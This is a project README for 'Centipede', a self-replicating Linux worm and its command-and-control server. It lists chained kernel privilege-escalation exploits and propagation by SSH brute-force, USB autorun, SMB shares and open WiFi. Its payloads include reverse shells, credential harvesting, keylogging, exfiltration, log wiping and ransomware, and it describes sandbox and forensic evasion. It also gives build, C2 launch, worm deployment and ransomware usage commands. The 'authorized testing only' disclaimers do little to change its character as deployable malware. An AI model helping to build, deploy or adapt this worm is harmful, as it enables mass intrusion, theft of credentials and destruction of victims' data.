# Centipede | churchofmalware.org

Self-replicating Linux worm with multi-layer C2 communication, privilege escalation via kernel exploits, dark web command interface, Discord fallback, and a full payload suite for post-exploitation operations.

**DISCLAIMER:** For authorized security testing and educational purposes only.

<img width="1536" height="1024" alt="worm2" src="https://github.com/user-attachments/assets/b6dd6bf8-0ffa-4048-959a-08878a160b67" />

```
centipede/
├── cmd/
│   ├── centipede/          # Worm implant binary
│   └── c2d/               # C2 server daemon
├── internal/
│   ├── scanner/           # Network discovery and WiFi scanning
│   ├── exploiter/         # Kernel exploit delivery and LPE chaining
│   ├── replicator/        # Self-propagation across SSH, WiFi, USB, HTTP, SMB, CVE
│   ├── c2/                # Multi-layer C2 client with fallback
│   ├── payloads/          # Post-exploitation payload suite (13 payloads)
│   ├── sensor/            # Environment fingerprinting and sandbox detection
│   └── common/            # Cryptographic and system utilities
├── web/                   # Dark web C2 dashboard
│   ├── static/css/        # Dark theme stylesheet
│   ├── static/js/         # Dashboard application logic
│   └── templates/         # HTML template
├── Makefile
└── README.md
```

## Architecture

### Vulnerability Exploitation

The worm carries multiple kernel privilege escalation exploits that chain automatically:

| Exploit | CVE | Kernel Range | Architectures | Notes |
|---------|-----|--------------|---------------|-------|
| **DirtyFrag** | CVE-2026-43284 + CVE-2026-43500 | 4.x - 6.x | x86_64, AARCH64 | IPsec ESP + RxRPC UAF chain. Original dirtyfrag implementation |
| **Fragnesia** | CVE-2026-43284 + CVE-2026-43500 | 4.x - 6.x | x86_64, AARCH64 | Dirtyfrag variant with different memory layout and exploitation path. Covers cases where original dirtyfrag fails |
| **Copy-Fail** | CVE-2026-31431 | 5.x - 6.x | x86_64, AARCH64 | AF_ALG/algif_aead page-cache write via splice primitive. Unified payload for both architectures (thanks Jakeswiz for extending architecture support for copyfail) |
| **Dirty Pipe** | CVE-2022-0847 | 5.8 - 5.16 | x86_64, AARCH64 | Direct pipe write to overwrite read-only files |
| **PwnKit** | CVE-2021-4034 | All | All | pkexec argument injection on any distribution with pkexec installed |
| **GameOverlay** | CVE-2023-3269 | 5.x+ | x86_64, AARCH64 | Ubuntu overlayfs LPE |
| **OverlayFS** | CVE-2023-2640 | 5.x+ | x86_64, AARCH64 | Additional Ubuntu overlayfs LPE vector |

The exploiter automatically detects kernel version, architecture (x86_64 or AARCH64), checks available kernel modules and capabilities, and chains exploits until root is obtained. DirtyFrag and Fragnesia run sequentially — if one fails due to kernel memory layout differences, the other may succeed. The unified Copy-Fail exploit includes both x86_64 and ARM64 payloads, making Centipede effective across cloud instances, Raspberry Pi botnets, and ARM-based servers.

### CVE-Based Propagation

Once a host is compromised and root is achieved, the worm uses the same exploit chain as a propagation vector:

1. Scanner discovers hosts on adjacent subnets (ARP sweep, TCP connect scan)
2. For each discovered host with open ports, the replicator attempts to deliver the worm binary via:
   - HTTP PUT upload (if port 80/8080/443 is open and accepts PUT)
   - FTP anonymous upload (if port 21 allows anonymous write)
   - SMB write to ADMIN$ or C$ shares (if port 445 is open)
   - SSH key-based and password brute-force (if port 22 is open)
3. Once the binary lands, it autonomously runs its LPE chain to escalate privileges
4. The new compromised host continues scanning and spreading

This creates a self-sustaining propagation cycle independent of manual C2 intervention.

### C2 Communication Layers

Four fallback communication layers in priority order:

1.  **WebSocket** — Encrypted bidirectional channel to C2 server. Primary communication method.
2.  **DNS Tunnelling** — Commands and responses encoded in DNS TXT queries. Bypasses HTTP/HTTPS filtering.
3.  **Discord Bot** — C2 commands and results relayed through Discord via bot API.
4.  **ICMP Tunnelling** — Data encoded in ICMP echo payload fields. Last-resort fallback.

All layers use end-to-end encryption with AES-GCM. The client automatically cycles through layers, falling back on connection failure and returning to higher-priority layers when connectivity is restored.

### Self-Replication Vectors

- **SSH Spread** — Harvests existing SSH keys from .ssh/, known_hosts, and config. Copies binary and executes. Falls back to password brute-force with common credentials (root, admin, vagrant, ubuntu, pi, etc).
- **WiFi Spread** — Scans for open WiFi networks using iw and nmcli, connects to discovered access points, and scans the new network for accessible hosts.
- **USB Spread** — Detects writable removable media, copies binary with hidden attributes and autorun.inf.
- **HTTP/FTP/SMB Spread** — Attempts worm delivery via HTTP PUT, FTP anonymous write, and SMB ADMIN$/C$ shares.
- **Lateral Movement** — SMB and WMI propagation for mixed environments.

### C2 Server

The C2 daemon provides:
- Dark web dashboard with real-time bot monitoring and activity feed
- Live WebSocket streaming for bot event updates
- Discord bot integration for command relay and result forwarding
- RESTful API for programmatic control
- Bot tagging and grouping for targeted command dispatch
- Command queue with execution tracking

### Payload Suite

**DISCLAIMER:** For authorized security testing and educational purposes only.

| Payload | Description |
|---------|-------------|
| reverse_shell | Spawn reverse or bind shell on target |
| persist | Install via systemd, cron, .bashrc hooks, LD_PRELOAD |
| harvest | Extract credentials: /etc/shadow, SSH keys, env vars, DB configs, cloud credentials, Kubernetes configs |
| lateral | Inject SSH keys, scan known_hosts, discover orchestration infrastructure |
| pivot | Enable IP forwarding, SOCKS proxy, NAT masquerade |
| keylog | Capture keystrokes from input devices |
| sniff | Capture network traffic via tcpdump |
| enum | Full system enumeration: kernel, users, network, containers, cloud |
| exfil | Exfiltrate binary and harvested data via HTTP POST |
| wipe | Clear logs, history, journald, auditd, wtmp, randomize MAC |
| selfdestruct | Remove all traces, delete binary, and exit |
| ransomware | AES-256-GCM file encryption with operator-defined key. Key can be pre-set or auto-generated. Encrypts targeted file types across specified directories |
| ransomware_decrypt | Decrypt .centipede files using the same key used for encryption. Restores original files and removes ransom notes |

### Ransomware Payload

** Disclaimer extremly destructive!** must have authorization before using. proceed carefully.

The ransomware payload provides operator-controlled file encryption:

- **Key Management**: Operator provides a 32-byte (64 hex char) key via the `key` argument. If no key is provided, one is auto-generated and returned.
- **File Selection**: Encrypts files by extension (documents, media, archives, databases, certificates, configs, source code, cloud configs). Targets directories specified in `dirs` argument (defaults to /home, /root, /var/www, /etc, /opt, /srv).
- **Encryption**: AES-256-GCM per file with unique nonce. Encrypted files get .centipede extension appended.
- **Ransom Note**: Written to each targeted directory root.
- **Decryption**: ransomware_decrypt payload with the same key restores all files.
- **Skip Protection**: Already-encrypted .centipede files are skipped.

Usage via C2:
```
> ransomware key="" dirs="/home,/root"
> ransomware key="a1b2c3d4..." dirs="/var/www"
> ransomware_decrypt key="a1b2c3d4..."
```

## Quick Start

### Build

```
git clone https://github.com/ekomsSavior/Centipede
cd Centipede
make build
```

### Start C2 Server

```
./bin/c2d -addr :8443
```

With Discord relay:

```
./bin/c2d -addr :8443 -discord-token "YOUR_BOT_TOKEN" -discord-channel "CHANNEL_ID"
```

### Deploy Worm

With direct C2 endpoint:

```
./bin/centipede -c2 ws://YOUR_C2_IP:8443/ws/bot
```

With all fallbacks:

```
./bin/centipede \
    -c2 ws://YOUR_C2_IP:8443/ws/bot \
    -c2-dns c2.yourdomain.com \
    -c2-discord-token "TOKEN" \
    -c2-discord-channel "CHANNEL_ID" \
    -c2-icmp YOUR_C2_IP
```

## C2 Dashboard

Access the dark web dashboard at `http://YOUR_C2_IP:8443/`. The interface provides:

- Real-time bot activity feed with live WebSocket streaming
- Command dispatch to individual bots, tagged groups, or all bots
- Payload selection and deployment with pre-configured options
- Exploit status monitoring with CVE details and kernel ranges
- Bot tagging and management

## Configuration

Configuration file (`/etc/centipede.conf`):

```json
{
    "c2_endpoint": "ws://c2.example.com:8443/ws/bot",
    "c2_dns_domain": "c2.example.com",
    "c2_discord_token": "YOUR_TOKEN",
    "c2_discord_channel": "CHANNEL_ID",
    "c2_icmp_target": "c2.example.com",
    "scan_interval": 300,
    "spread_interval": 300,
    "exploit": true,
    "replication": true,
    "masquerade": true
}
```

Command-line flags override config file values. The config file is read from /etc/centipede.conf by default.

## Exploit Chain

**DISCLAIMER:** For authorized security testing and educational purposes only.

The exploit chain executes in order until root is obtained:

1. **DirtyFrag** (CVE-2026-43284 + CVE-2026-43500) — Kernel 4.x through 6.x. IPsec ESP + RxRPC UAF chain. Primary exploitation path.
2. **Fragnesia** (CVE-2026-43284 + CVE-2026-43500) — Kernel 4.x through 6.x. Dirtyfrag variant with different memory layout. Attempts when DirtyFrag fails due to kernel memory layout differences.
3. **Copy-Fail** (CVE-2026-31431) — Kernel 5.x through 6.x with algif_aead module. Unified payload for x86_64 and AARCH64. Uses AF_ALG + splice primitive to corrupt /usr/bin/su.
4. **Dirty Pipe** (CVE-2022-0847) — Kernel 5.8 through 5.16.
5. **PwnKit** (CVE-2021-4034) — Any distribution with pkexec installed.
6. **GameOverlay** (CVE-2023-3269) — Ubuntu kernels with overlayfs.
7. **OverlayFS** (CVE-2023-2640) — Ubuntu kernels with overlayfs.

Each exploit checks its preconditions (module loaded, file exists, kernel version range, architecture compatibility) before attempting. Failures are non-fatal and the chain continues.

## Detection Evasion

- Sandbox environment detection before execution (CPU count, /proc/cpuinfo content)
- Process name masquerading as kernel threads ([kworker/u256+0], [jbd2/dm-0-8], etc.)
- Encrypted configuration blobs (no hardcoded strings in binary)
- Forensic cleanup payload wipes shell history, system logs, journald, auditd, and login records
- MAC address randomization on compromised hosts (root only)
- Configurable sleep intervals with jitter

## Credits

Built by **ek0ms**

Special thanks to the exploit research community, especially JakeSwiz https://github.com/0xXyc/ (0xXyc) for the AARCH64 port of Copy-Fail and contributions to the Fragnesia dirtyfrag variant- https://github.com/v12-security/pocs/tree/main/fragnesia
